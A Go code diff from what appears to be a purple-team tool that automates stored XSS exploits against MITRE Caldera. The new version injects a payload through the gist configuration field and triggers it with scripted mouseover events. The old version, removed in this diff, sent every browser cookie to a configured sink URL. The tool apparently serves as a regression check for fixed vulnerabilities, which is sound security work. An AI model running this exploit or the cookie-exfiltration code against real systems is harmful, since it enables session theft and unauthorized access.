@@ -23,13 +23,10 @@ THE SOFTWARE.
 package cmd
 
 import (
-	"bytes"
 	"context"
-	"encoding/json"
 	"errors"
 	"fmt"
 	"math"
-	"net/http"
 	"os"
 
 	"github.com/chromedp/cdproto/emulation"
@@ -44,17 +41,16 @@ import (
 )
 
 var (
-	// StoredXSSDosCmd runs the XSS vulnerability found after DEF CON 30.
-	StoredXSSDosCmd = &cobra.Command{
-		Use:   "StoredXSSDos",
-		Short: "Stored XSS found in addition to the previously reported one",
+	storedXSSTresCmd = &cobra.Command{
+		Use:   "storedXSSTres",
+		Short: "Third stored XSS found in MITRE Caldera by Jayson Grace from Meta's Purple Team",
 		Run: func(cmd *cobra.Command, args []string) {
 			fmt.Println(color.YellowString(
-				"Introducing stored XSS vulnerability #2, please wait..."))
+				"Introducing stored XSS vulnerability #3, please wait..."))
 
 			caldera.URL = viper.GetString("login_url")
 			caldera.RepoPath = viper.GetString("repo_path")
-			caldera.Creds, err = GetRedCreds(caldera.RepoPath)
+			caldera.Creds, err = getRedCreds(caldera.RepoPath)
 			if err != nil {
 				log.WithError(err).Fatalf(
 					"failed to get Caldera credentials: %v", err)
@@ -70,108 +66,52 @@ var (
 
 			caldera.Driver = driver
 
-			caldera, err = Login(caldera)
+			caldera, err = login(caldera)
 			if err != nil {
 				log.WithError(err).Fatal("failed to login to caldera")
 			}
 
 			caldera.Payload = viper.GetString("payload")
 
-			if err = storedXSSDosVuln(caldera.Payload); err != nil {
+			if err = storedXSSTresVuln(caldera.Payload); err != nil {
 				log.WithError(err).WithFields(log.Fields{
 					"Payload": caldera.Payload,
 				}).Error(color.RedString(err.Error()))
 			}
 		},
 	}
-	storedXSSDosSuccess bool
-	introPayload        bool
+	storedXSSTresSuccess bool
 )
 
 func init() {
-	rootCmd.AddCommand(StoredXSSDosCmd)
-	storedXSSDosSuccess = false
+	rootCmd.AddCommand(storedXSSTresCmd)
+	storedXSSTresSuccess = false
 	introPayload = false
 }
 
-// Payload is used to represent the POST
-// body associated with the source for the attack.
-type Payload struct {
-	Name               string `json:"name"`
-	AutoClose          bool   `json:"auto_close"`
-	State              string `json:"state"`
-	Autonomous         int    `json:"autonomous"`
-	UseLearningParsers bool   `json:"use_learning_parsers"`
-	Obfuscator         string `json:"obfuscator"`
-	Jitter             string `json:"jitter"`
-	Visibility         string `json:"visibility"`
-}
+// // Payload is used to represent the POST
+// // body associated with the source for the attack.
+// type Payload struct {
+// 	Name               string `json:"name"`
+// 	AutoClose          bool   `json:"auto_close"`
+// 	State              string `json:"state"`
+// 	Autonomous         int    `json:"autonomous"`
+// 	UseLearningParsers bool   `json:"use_learning_parsers"`
+// 	Obfuscator         string `json:"obfuscator"`
+// 	Jitter             string `json:"jitter"`
+// 	Visibility         string `json:"visibility"`
+// }
 
-func storedXSSDosVuln(payload string) error {
+func storedXSSTresVuln(payload string) error {
 	var buf []byte
 	var res *runtime.RemoteObject
 
-	data := Payload{
-		Name:               payload,
-		AutoClose:          false,
-		State:              "running",
-		Autonomous:         1,
-		UseLearningParsers: true,
-		Obfuscator:         "plain-text",
-		Jitter:             "2/8",
-		Visibility:         "51",
-	}
-	sinkURL := viper.GetString("sink_url")
-
-	if err := chromedp.Run(caldera.Driver.Context,
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			cookies, err := network.GetCookies().Do(ctx)
-			if err != nil {
-				log.WithError(err).Error("failed to retrieve cookies")
-				return err
-			}
-			for _, cookie := range cookies {
-				payloadBytes, err := json.Marshal(data)
-				if err != nil {
-					log.WithError(err).Error("failed to marshal payload")
-					return err
-				}
-				body := bytes.NewReader(payloadBytes)
-
-				req, err := http.NewRequest("POST", sinkURL, body)
-				if err != nil {
-					log.WithError(err).Error("failed to create request")
-					return err
-				}
-				req.Header.Set("Content-Type", "application/json")
-				req.Header.Set("Cookie", fmt.Sprintf("%s=%s", cookie.Name, cookie.Value))
-				req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36")
-
-				resp, err := http.DefaultClient.Do(req)
-				if err != nil {
-					log.WithError(err).Error("failed to submit request")
-					return err
-				}
-				defer resp.Body.Close()
-
-			}
-
-			return nil
-
-		})); err != nil {
-		log.WithError(err).Error("failed to retrieve cookie")
-		return err
-	}
-
 	// XPath and selectors for chromeDP
-	opLinkXPath := "/html/body/main/div[1]/aside/ul[1]/li[4]/a"
-	createOPXPath := "/html/body/main/div[2]/div[2]/div[1]/div/div/form/div/div[2]/button"
-	opNameSelector := "#op-name"
-	startButtonXPath := "/html/body/main/div[2]/div[2]/div[1]/div/div/div[3]/div[2]/footer/nav/div[2]/div/button"
+	configLinkXPath := "/html/body/main/div[1]/aside/ul[3]/li[6]/a"
+	gistInputXPath := "/html/body/main/div[2]/div[2]/div/div/div[2]/div[2]/table/tbody/tr[9]/td[2]/input"
+	updateGistButtonXPath := "/html/body/main/div[2]/div[2]/div/div/div[2]/div[2]/table/tbody/tr[9]/td[3]/button"
 	debriefLinkXPath := "/html/body/main/div[1]/aside/ul[2]/li[4]/a"
 	firstOperationXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[1]/form/div/div/div/select/option[1]"
-	opGraphDropdownSelectXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[2]/div[3]/div[2]/div/select"
-	tacticSelector := "#debrief-graph > div.is-flex.graph-controls.m-2 > div > select"
 	triggerVulnJS := "nodes = document.querySelectorAll('[id^=node]'); nodes.forEach((x, i) => x.dispatchEvent(new MouseEvent('mouseover', {'bubbles': true})));"
 
 	imagePath := viper.GetString("image_path")
@@ -186,45 +126,52 @@ func storedXSSDosVuln(payload string) error {
 				err := chromedp.Run(caldera.Driver.Context,
 					page.HandleJavaScriptDialog(true))
 
-				// Account for initial payload introduction
-				if !introPayload {
-					introPayload = true
-				} else {
-					// If we have gotten here, the exploit succeeded.
-					storedXSSDosSuccess = true
-				}
+				// If we have gotten here, the exploit succeeded.
+				storedXSSTresSuccess = true
 
 				if err != nil {
-					log.Fatal(err)
+					log.WithError(err).Errorf("failed to handle js: %v", err)
+					return
 				}
 			}()
 		}
 	})
+
+	// handle payload that use alerts, prompts, etc.
+	chromedp.ListenTarget(caldera.Driver.Context, func(ev interface{}) {
+		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
+			go func() {
+				err := chromedp.Run(caldera.Driver.Context,
+					page.HandleJavaScriptDialog(true))
+
+				// If we have gotten here, the exploit succeeded.
+				storedXSSTresSuccess = true
+
+				if err != nil {
+					log.WithError(err).Errorf("failed to handle js: %v", err)
+					return
+				}
+			}()
+		}
+	})
+
 	if err := chromedp.Run(caldera.Driver.Context,
 		network.Enable(),
-		// Click the operations link
-		chromedp.Click(opLinkXPath),
+		// Click the configuration link
+		chromedp.Click(configLinkXPath),
 		chromedp.Sleep(Wait(2000)),
-		// Click Create Operation button
-		chromedp.Click(createOPXPath),
-		// Create operation with the provided payload
-		chromedp.SendKeys(opNameSelector, payload),
-		// Click the Start button
-		chromedp.Click(startButtonXPath),
+		// Introduce the payload
+		chromedp.SendKeys(gistInputXPath, payload),
+		chromedp.Sleep(Wait(2000)),
+		// Update the gist configuration with the malicious payload
+		chromedp.Click(updateGistButtonXPath),
 		chromedp.Sleep(Wait(2000)),
 		// Click the debrief link
 		chromedp.Click(debriefLinkXPath),
-		chromedp.Sleep(Wait(2000)),
 		// Click the operation with the payload that we introduced previously
 		chromedp.Click(firstOperationXPath),
 		chromedp.Sleep(Wait(2000)),
-		// Click the debrief graph dropdown menu
-		chromedp.Click(opGraphDropdownSelectXPath),
-		chromedp.Sleep(Wait(2000)),
-		// Select Tactic from the operation graph dropdown menu
-		chromedp.SendKeys(tacticSelector, "Tactic"),
-		chromedp.Sleep(Wait(2000)),
-		// Trigger the vulnerability
+		// Move mouse over C2 Server image to trigger the exploit
 		chromedp.Evaluate(triggerVulnJS, &res),
 		chromedp.Sleep(Wait(2000)),
 		chromedp.ActionFunc(func(ctx context.Context) error {
@@ -267,22 +214,22 @@ func storedXSSDosVuln(payload string) error {
 		})); err != nil {
 		log.WithError(err).WithFields(log.Fields{
 			"Payload": payload,
-		}).Error("unexpected error while introducing the exploit")
+		}).Error("unexpected error while exploiting the vulnerability")
 		return err
 	}
 
-	if err := os.WriteFile(imagePath+"2.png", buf, 0644); err != nil {
+	if err := os.WriteFile(imagePath+"3.png", buf, 0644); err != nil {
 		log.WithError(err).Error("failed to write screenshot to disk")
 	}
 
-	if storedXSSDosSuccess {
-		errMsg := "failure: Stored XSS Dos ran successfully"
+	if storedXSSTresSuccess {
+		errMsg := "failure: Stored XSS Tres ran successfully"
 		return errors.New(errMsg)
 	}
 
 	log.WithFields(log.Fields{
 		"Payload": payload,
-	}).Info(color.GreenString("Success: Stored XSS Dos failed to run"))
+	}).Info(color.GreenString("Success: Stored XSS Tres failed to run"))
 
 	return nil
 }
